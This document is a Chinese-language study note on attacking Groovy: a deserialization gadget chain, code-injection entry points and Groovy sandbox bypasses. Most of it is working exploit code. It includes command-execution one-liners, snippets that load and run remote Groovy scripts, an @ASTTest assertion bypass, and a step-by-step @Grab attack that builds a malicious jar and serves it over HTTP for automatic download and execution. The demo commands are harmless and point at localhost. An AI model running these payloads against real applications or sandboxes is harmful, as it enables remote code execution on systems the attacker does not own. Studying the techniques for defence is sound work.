## 反序列化

- Groovy_POC.java

  ```java
  AnnotationInvocationHandler.readObject()
      Map.entrySet() (Proxy)
          ConversionHandler.invoke()
              ConvertedClosure.invokeCustom()
  		        MethodClosure.call()
                      ProcessGroovyMethods.execute()
  ```

## 代码注入

如果外部可控输入Groovy代码或者外部可上传一个恶意的Groovy脚本，且程序并未对输入的Groovy代码进行有效的过滤，那么会导致恶意的Groovy代码注入，从而RCE

![image-20220419175302032](image-20220419175302032.png)

运行这样一个Groovy代码，将会弹出一个计算器，成功执行了命令(def是用来定义标识符)

```java
//其他执行命令执行的方法
Runtime.getRuntime().exec("calc")
"calc".execute()
'calc'.execute()
"${"calc".execute()}"
"${'calc'.execute()}"

//回显的方式
println "whoami".execute().text
println 'whoami'.execute().text
println "${"whoami".execute().text}"
println "${'whoami'.execute().text}"
def cmd = "whoami";
println "${cmd.execute().text}"
```

### MethodClosure

看看他的构造方法

![image-20220419213413728](image-20220419213413728.png)

可以发现他传入了一个对象，第二个是对象的方法，通过其中的docall方法进行调用

但是`docall`方法是`protected`修饰的，不能直接调用，调用它的父类`Closure`的call方法间接调用

```java
package ysoserial.vulndemo;

import org.codehaus.groovy.runtime.MethodClosure;

public class GroovyInject {
    public static void main(String[] args) {
//        MethodClosure methodClosure = new MethodClosure(Runtime.getRuntime(), "exec");
//        methodClosure.call("calc");
        MethodClosure methodClosure = new MethodClosure("calc", "execute");
        methodClosure.call();
    }
}
```

### GroovyShell

类中的`evaluate`方法有多个重载，支持有`GroovyCodeSource String File URI 等参数类型，能够通过Groovy代码写入或者本地加载或者远程加载Groovy脚本来执行命令

其中的`parse`方法就是或者对应的Groovy脚本，之后调用run方法进行执行代码内容

```java
//直接执行Groovy代码
GroovyShell shell = new GroovyShell();
shell.evaluate("\'calc\'.execute()");
```

```java
//通过加载本地脚本
GroovyShell shell = new GroovyShell();
Script script = shell.parse(new File("src/main/java/ysoserial/vulndemo/GroovyTest.groovy"));
script.run();

GroovyShell shell = new GroovyShell();
shell.evaluate(new File("src/main/java/ysoserial/vulndemo/GroovyTest.groovy"));
```

```java
//通过加载远程脚本
GroovyShell shell = new GroovyShell();
shell.evaluate(new URI("http://127.0.0.1:8888/GroovyTest.groovy"));
```

这里的url和Groovy代码同样可以通过GroovyCodeSource封装之后执行`evalute`执行代码

### GroovyScriptEngine

GroovyScriptEngine可从指定的位置（文件系统、URL、数据库等等）加载Groovy脚本，并且随着脚本变化而重新加载它们

其构造方法存在重载的方式，可以指定远程Url/根文件位置/ClassLoader

之后通过使用run方法回显，有两个重载，一个是传入脚本名和对应的参数，另一个是脚本名和Binding对象

```java
//通过传入根路径之后调用对应的脚本
GroovyScriptEngine scriptEngine = new GroovyScriptEngine("src/main/java/ysoserial/vulndemo");
scriptEngine.run("GroovyTest.groovy", "");
```

```java
//通过调用远程url之后调用特定脚本
GroovyScriptEngine scriptEngine = new GroovyScriptEngine("http://127.0.0.1:8888/");
scriptEngine.run("GroovyTest.groovy", "");
```

```java
//通过Binding加载
GroovyScriptEngine scriptEngine = new GroovyScriptEngine("");
scriptEngine.run("src/main/java/ysoserial/vulndemo/GroovyTest.groovy", new Binding());
```

### GroovyClassLoader

GroovyClassLoader是一个定制的类装载器，负责解释加载Java类中用到的Groovy类，重写了loadClass和defineClass方法

`parseClass` 可以直接从文件或者字符串中获取groovy类

```java
//从文件中获取Groovy类
GroovyClassLoader groovyClassLoader = new GroovyClassLoader();
Class aClass = groovyClassLoader.parseClass(new File("src/main/java/ysoserial/vulndemo/GroovyTest.groovy"));
GroovyObject object = (GroovyObject) aClass.newInstance();
object.invokeMethod("main", "");
```

```java
//从文本中获取Groovy类
GroovyClassLoader groovyClassLoader = new GroovyClassLoader();
Class aClass = groovyClassLoader.parseClass("class GroovyTest {\n" +
"    static void main(args){\n" +
"        println \"${'whoami'.execute().text}\"\n" +
"\n" +
"    }\n" +
"}");
GroovyObject groovyObject = (GroovyObject) aClass.newInstance();
groovyObject.invokeMethod("main", "");
```

### ScriptEngine

在ScriptEngine中，支持名为“groovy”的引擎，可用来执行Groovy代码。这点和在SpEL表达式注入漏洞中讲到的同样是利用ScriptEngine支持JS引擎从而实现绕过达到RCE是一样的

```java
ScriptEngine scriptEngine = new ScriptEngineManager().getEngineByName("groovy");
System.out.println(scriptEngine.eval("\"whoami\".execute().text"));
```

### bypass方法

#### 反射+字符串拼接

#### Groovy沙箱绕过

Groovy代码注入都是注入了execute()函数，从而能够成功执行Groovy代码，这是因为不是在Jenkins中执行即没有Groovy沙箱的限制。但是在存在Groovy沙箱即只进行AST解析无调用或限制execute()函数的情况下就需要用到其他技巧了

##### @AST注解执行断言

利用AST注解能够执行断言从而实现代码执行

```java
//@AST注解执行断言
this.class.classLoader.parseClass("""
    @groovy.transform.ASTTest(value={
        assert Runtime.getRuntime().exec("calc")
    })
    def x
""")
```

![image-20220420165003323](image-20220420165003323.png)

##### @Grab注解加载远程恶意类

Grape是Groovy内建的一个动态Jar依赖管理程序，允许开发者动态引入不在ClassPath中的函式库

需要导入`ivy`依赖，不然会报错(你可以试试)

```java
<dependency>
    <groupId>org.apache.ivy</groupId>
    <artifactId>ivy</artifactId>
    <version>2.4.0</version>
</dependency>
```

###### POC

```java
//@Grab注解加载远程恶意类
this.class.classLoader.parseClass("""
    @GrabConfig(disableChecksums=true)
    @GrabResolver(name="Poc", root="http://127.0.0.1:8888/")
    @Grab(group="Poc", module="EvilJar", version="0")
    import java.lang.String
""");
```

这里的加载依赖会看本地仓库是否有，如果没有就从root服务器的`group/module/version`目录里面下载`EvilJar-0.jar`文件，默认存放在`~/.groovy/grapes`目录下

之后使用`processOtherServices`方法处理其他服务，比如这里的name

![image-20220420201627587](image-20220420201627587.png)

我们就需要在服务器上编写一个恶意类

```java
//Poc.java
public class Poc{
    Poc() throws Exception{
        Runtime.getRuntime().exec("calc");
    }
}
```

```java
//编译成.class文件
javac Poc.java
//创建目录
mkdir -p META-INF/services/
//在org.codehaus.groovy.plugins.Runners中写入加载的类名Poc
echo Poc > META-INF/services/org.codehaus.groovy.plugins.Runners
//将.class文件打包成jar包
jar cvf module-version.jar Poc.class META-INF/
//创建放jar包的目录
mkdir -p group/module/version/
//将jar包复制到该目录下
mv module-version.jar group/module/version
//之后开启http服务
```